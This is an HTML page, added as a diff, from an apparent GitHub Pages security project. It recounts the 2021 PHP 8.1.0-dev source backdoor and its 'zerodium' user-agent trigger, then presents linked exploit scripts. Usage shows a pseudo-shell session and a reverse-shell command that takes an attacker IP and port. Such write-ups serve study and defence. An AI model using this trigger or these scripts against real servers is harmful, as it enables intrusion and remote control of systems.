@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>php-8.1.0-dev-backdoor-rce | PHP 8.1.0-dev Backdoor System Shell Script</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="php-8.1.0-dev-backdoor-rce" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="PHP 8.1.0-dev Backdoor System Shell Script" />
+<meta property="og:description" content="PHP 8.1.0-dev Backdoor System Shell Script" />
+<link rel="canonical" href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/" />
+<meta property="og:url" content="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/" />
+<meta property="og:site_name" content="php-8.1.0-dev-backdoor-rce" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="php-8.1.0-dev-backdoor-rce" />
+<script type="application/ld+json">
+{"description":"PHP 8.1.0-dev Backdoor System Shell Script","headline":"php-8.1.0-dev-backdoor-rce","url":"https://flast101.github.io/php-8.1.0-dev-backdoor-rce/","@type":"WebSite","name":"php-8.1.0-dev-backdoor-rce","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/php-8.1.0-dev-backdoor-rce/assets/css/style.css?v=7a7be1c8b4932460e26a4ea532cb5bd3801a1580">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/php-8.1.0-dev-backdoor-rce/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/php-8.1.0-dev-backdoor-rce/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          <li class="fork"><a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce">View On GitHub</a></li>
+          
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>php-8.1.0-dev-backdoor-rce</h1>
+          <p>PHP 8.1.0-dev Backdoor System Shell Script</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/flast101">flast101</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/michigangraham">mattgraham</a></span>
+        </div>
+
+        <p><em><a href="https://flast101.github.io">&lt;– Home</a></em></p>
+
+<h1 id="php-810-dev-backdoor-remote-code-execution">PHP 8.1.0-dev Backdoor Remote Code Execution</h1>
+<p><em>PHP 8.1.0-dev Backdoor System Shell Script</em></p>
+
+<p><img src="logo_php81.png" alt="logo_php8.png" title="logo_php81.png" /></p>
+
+<p>PHP verion 8.1.0-dev was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.</p>
+
+<p>The original code was restored after the issue was discovered, but then tampered with a second time. The breach would have created a backdoor in any websites that ran the compromised version of PHP, enabling hackers to perform remote code execution on the site.</p>
+
+<hr />
+
+<h2 id="summary">Summary</h2>
+
+<p>1- The Story <br />
+2- POC Script  <br />
+3- Reverse Shell</p>
+
+<hr />
+<h2 id="1--the-story">1- The Story</h2>
+
+<h3 id="11--php-source-code-targeted-in-backdoor-attack-">1.1- PHP source code targeted in backdoor attack ?</h3>
+
+<p>Two malicious commits were pushed to the PHP Git code repo on Sunday, March 28, and signed off under the names of PHP creator, Rasmus Lerdorf, and maintainer Nikita Popov.</p>
+
+<p>In the malicious commits, the attackers published a mysterious change upstream, “fix typo” under the pretense this was a minor typographical correction.</p>
+
+<p><img src="php-repo.png" alt="php-repo.png" title="php-repo.png" /></p>
+
+<p>However, taking a look at the added line 370 where <code class="language-plaintext highlighter-rouge">zend_eval_string</code> function is called, the code actually plants a backdoor for obtaining easy Remote Code Execution (RCE) on a website running this hijacked version of PHP. This line executes PHP code from within the useragent HTTP header, if the string starts with ‘zerodium’.<br />
+Zerodium is a Washington-based security firm that specializes in buying and selling zero-day vulnerabilities for a variety of operating systems and popular desktop and Web applications, including for PHP itself.</p>
+
+<p>According to PHP maintainers, this malicious activity stemmed from the compromised git.php.net server, rather than compromise of an individual’s Git account. Official announcement states the incident points towards a server compromise.</p>
+
+<p><img src="php-git.png" alt="php-git.png" title="php-git.png" /></p>
+
+<h3 id="12--php-sites-user-database-was-hacked">1.2- PHP Site’s User Database Was Hacked</h3>
+
+<p>Further investigation into the incident has revealed that the commits were a result of pushing them using HTTPS and password-based authentication, leading them to suspect a possible leak of the master.php.net user database.</p>
+
+<p><img src="php-logs.jpg" alt="php-logs.jpg" title="php-logs.jpg" /></p>
+
+<p>Additionally, the master.php.net authentication system is said to be on a very old operating system and a version of PHP, raising the possibility that the attackers may have also exploited a vulnerability in the software to stage the attack.</p>
+
+<p>As a consequence, the maintainers have migrated master.php.net to a new main.php.net system with support for TLS 1.2, in addition to resetting all existing passwords and storing passwords using bcrypt instead of a plain MD5 hash.</p>
+
+<h2 id="2--poc-script">2- POC Script</h2>
+
+<p>This short exploit script <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py">backdoor_php_8.1.0-dev.py</a> uses the backdoor to provide a pseudo system shell on the host. Find it on <a href="https://www.exploit-db.com/exploits/49933">Exploit DB</a>.</p>
+
+<ul>
+  <li><strong>Exploit Title:</strong> PHP 8.1.0-dev Backdoor Remote Code Execution</li>
+  <li><strong>Date:</strong> 23 may 2021</li>
+  <li><strong>Exploit Author:</strong> flast101</li>
+  <li><strong>Vendor Homepage:</strong> <a href="https://www.php.net/">https://www.php.net/</a></li>
+  <li><strong>Software Link:</strong> <a href="https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor">https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor</a></li>
+  <li><strong>Tested on version:</strong> 8.1.0-dev</li>
+  <li><strong>CVE</strong> : N/A</li>
+  <li><strong>Vulnerability references</strong>:  <br />
+<a href="https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a">https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a</a>  <br />
+<a href="https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md</a></li>
+</ul>
+
+<p>Usage:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(user㉿kali)-[~/Documents]
+└─$ python3 backdoor_php_8.1.0-dev.py
+  
+Enter the host url:
+http://a.b.c.d
+
+Interactive shell is opened on http://a.b.c.d 
+Can't acces tty; job crontol turned off.
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="3--reverse-shell">3- Reverse Shell</h2>
+
+<p>This short exploit script <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py">revshell_php_8.1.0-dev.py</a> gives a reverse shell on target.</p>
+
+<p>Usage:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(user㉿kali)-[~/Documents]
+└─$ python3 revshell_php_8.1.0-dev.py &lt;target URL&gt; &lt;attacker IP&gt; &lt;attacker PORT&gt;
+</code></pre></div></div>
+
+<p><img src="revshell-script.png" alt="revshell-script.png" title="revshell-script.png" /></p>
+
+<p>Be Curious, Learning is Life !</p>
+
+<p><em><a href="https://flast101.github.io">&lt;– Home</a></em></p>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-173692234-1"></script>
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-173692234-1');
+</script>
+
+
+
+      </section>
+
+    </div>
+
+    
+  </body>
+</html>
